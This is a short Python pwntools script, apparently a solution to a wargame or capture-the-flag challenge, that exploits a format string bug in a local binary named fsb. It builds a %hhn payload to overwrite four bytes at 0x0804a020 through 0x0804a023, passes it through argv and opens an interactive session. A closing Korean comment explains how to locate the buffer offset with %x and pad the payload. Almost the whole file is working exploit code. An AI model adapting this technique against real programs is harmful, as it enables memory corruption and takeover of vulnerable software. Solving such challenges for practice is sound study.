from pwn import *
payload = ""
payload += "%19c%141$hhn%1c%140$hhn%1c%139$hhn%1c%138$hhn"
payload += p32(0x0804a020)
payload += p32(0x0804a021)
payload += p32(0x0804a022)
payload += p32(0x0804a023)
payload += "AAA"
context.log_level = "debug"
p = process(["/home/fsb/fsb", payload])
p.interactive()

"""
argv의 stack이 buf에서 멀리 떨어져있는 문제
1. %x를 무수히 넣어서 buf가 어느 위치에 떨어져 있는지 확인
2. 만약 값이 제대로 들어가지 않았다면 뒤쪽에 padding을 넣어서 byte를 맞춘다.
"""
